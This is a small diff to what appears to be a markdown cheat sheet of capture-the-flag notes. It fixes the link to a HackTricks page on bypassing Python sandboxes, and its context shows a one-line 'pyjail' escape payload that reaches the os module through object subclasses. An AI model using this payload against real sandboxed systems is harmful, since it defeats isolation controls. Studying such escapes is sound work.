@@ -13,7 +13,7 @@ def index():
 ----
 ## Pyjail
 
-- [Bypass Python Sandboxes]('https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes')
+- [Bypass Python Sandboxes](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)
 ```python
 [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os")
 ```
